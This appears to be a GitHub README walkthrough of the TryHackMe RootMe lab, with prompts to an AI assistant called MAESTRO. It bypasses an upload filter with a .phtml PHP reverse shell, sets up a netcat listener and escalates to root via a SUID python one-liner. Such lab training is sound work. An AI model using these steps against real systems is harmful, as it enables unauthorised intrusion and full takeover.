# TryHackMe RootMe Walkthrough with MAESTRO

This walkthrough will guide you through the **RootMe** room on TryHackMe, using the **MAESTRO AI assistant** to help automate and understand key parts of the pentesting process.

---

## 🛠 Prerequisites

- [ ] A TryHackMe account
- [ ] Access to the **RootMe** room: [https://tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme)
- [ ] MAESTRO running and accessible
- [ ] AttackBox started via TryHackMe interface

---

## 🚀 Step-by-Step Walkthrough

### 🔹 Step 1: Launch MAESTRO
Make sure your MAESTRO instance is up and running.

![MAESTRO_Home_Screen](https://github.com/user-attachments/assets/d5144a29-b8b5-468e-93f5-7b599f196230)

---

### 🔹 Step 2: Start the Room
1. Go to [RootMe Room](https://tryhackme.com/room/rrootme)
2. Complete Task 1
3. Start the **AttackBox**

---

### 🔹 Step 3: Begin Enumeration (Task 2)

#### 🧠 Prompt MAESTRO:
```
I am working through a TryHackMe room and need your assistance. How can I scan the machine and check how many ports are open? The IP address is {IP_ADDRESS}
```
![Response](https://github.com/user-attachments/assets/39497a22-f27e-4665-9683-186efca4ca74)

#### ✅ Command:
```bash
nmap -sV -p- {IP_ADDRESS}
```
![Terminal Output](https://github.com/user-attachments/assets/03b5cfb1-f104-49f7-a65d-a0708acce174)

#### 🧠 Next Prompt:
```
Now I have been asked to find directories on the Apache web server using GoBuster. How do I do this?
```
![Response](https://github.com/user-attachments/assets/c3ad5a46-c159-4156-8d31-b032719b9bda)

#### ✅ Command:
```bash
gobuster dir -u http://{TARGET_IP} -w /usr/share/wordlists/dirb/common.txt -t 50
```
![Terminal Output](https://github.com/user-attachments/assets/6da38b44-e41e-4d36-a059-f35326f499ff)

Take note of any interesting files or directories, especially `index.php`.

#### 🧠 Final Prompt for Task 2:
```
My gobuster command returned these interesting directories: /css, /js, /panel, and /uploads. Which of these is the hidden directory?
```
![Response](https://github.com/user-attachments/assets/3b4515e7-d912-4ae4-a9c2-5a53fdd728e8)

MAESTRO identifies **`/panel`** as the likely hidden directory.

---

### 🔹 Step 4: Upload Reverse Shell (Task 3)

#### 🧠 Prompt:
```
My task is to find a form to upload a PHP reverse shell and find the flag. How do I do this?
```
![Response](https://github.com/user-attachments/assets/9d3b5312-ca7a-4bdd-b49e-23e927a4dd83)

MAESTRO responds with a template: `php_reverse_shell.php`. After attempting to upload this to the http://{VICTIM_IP}/panel webpage, it is unsuccessful, saying it does not accept .php files. So, we can prompt MAESTRO with how to get around this.

NOTE: you can also prompt MAESTRO for where a PHP reverse shell is already available on the AttackBox VM.
#### 🧠 Prompt:
```
Where can I find php_reverse_shell.php on a TryHackMe AttackBox VM?
```
![Response](https://github.com/user-attachments/assets/a97a1d57-f282-499d-b1d2-96c5c5feaa51)

#### 🧠 Prompt:
```
The /panel page won't allow me to upload a .php file to upload the reverse shell. How do I get around this?
```
![Response](https://github.com/user-attachments/assets/951b8cad-7410-44ad-a6c1-ed38bcd210a8)

🔄 **Tip**: After testing each of the file extensions, the file extension `.phtml` proves successful.

Upload it to:  
```
http://{VICTIM_IP}/panel
```
![/panel Webpage](https://github.com/user-attachments/assets/2183799f-a39c-4f0a-8a2e-47ca6f9a1bfd)
![Upload PHP Reverse Shell File](https://github.com/user-attachments/assets/082c316a-c376-412e-ad73-148cba0f05b6)

View it at:  
```
http://{VICTIM_IP}/uploads
```
## Setup a listener to catch the reverse shell:
#### 🧠 Prompt:
```
I need to set up a listener on port 4444 to catch the reverse shell. How do I do this?
```
![Response](https://github.com/user-attachments/assets/df585cb1-3818-4e73-910c-32e082ce9a23)

#### ✅ Command:
```bash
nc -lvnp 4444
```
![Terminal Output](https://github.com/user-attachments/assets/fdf3b126-483f-406b-aa18-e61e6a67c6f8)

Click the uploaded `.phtml` file to trigger the shell.

---
![Reverse Shell](https://github.com/user-attachments/assets/e8066eb6-f727-439b-be68-3c58930e42b3)

### 🔹 Step 5: Capture the Flag

#### 🧠 Prompt:
```
I need to find a flag in user.txt. How do I find this file?
```
![Response](https://github.com/user-attachments/assets/97afb697-9c45-48e2-bf93-9926c02b02f9)

#### ✅ Command:
```bash
find / -name user.txt 2>/dev/null
```
MAESTRO provides a command to locate the `user.txt` file. Open it to get the flag and complete Task 3.

![Terminal Output](https://github.com/user-attachments/assets/85676859-91a8-4e52-9eb7-de1e656ef7b2)

---

### 🔹 Step 6: Privilege Escalation (Task 4)

#### 🧠 Prompt:
```
Now I have to search for files with SUID permission and find which file is weird. How do I do this?
```
![Response](https://github.com/user-attachments/assets/7863af7c-3642-4795-a8a7-225869044311)
![Response](https://github.com/user-attachments/assets/645458ac-0204-4b30-bb6d-e7185d7f7661)

#### ✅ Command:
```bash
find / -type f -perm -4000 2>/dev/null
```

After searching for SUID files, we can give MAESTRO the files returned and ask which one we can use for privilege escalation.
#### 🧠 Prompt:
```
These are the SUID files that were returned, which of them can I use for privilege escalation? {Copy and paste files found here}
```
![Response](https://github.com/user-attachments/assets/8daf7deb-2eb9-4e7f-b1bd-ad4203db1f7a)
![Response Continued](https://github.com/user-attachments/assets/1b1151af-2b04-45c4-956e-8c8cdd7ab110)

Use the /usr/bin/python privilege escalation method given by MAESTRO.
#### ✅ Command:
```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
![Terminal Output](https://github.com/user-attachments/assets/a494ddc5-0438-432a-92bd-87b887381bfb)

As shown in the screenshot above, you can use the same technique for finding the flag in this root.txt as for finding the flag in user.txt. Once you have done this, you have successfully completed the Rootme TryHackMe room!

---

## 📜 Notes

- Use MAESTRO throughout for command recommendations and clarifications.
- Remember to update placeholders like `{IP_ADDRESS}` and `{TARGET_IP}`.
- Don’t forget to clean up any shells or listeners you’ve opened once you’re done.

---
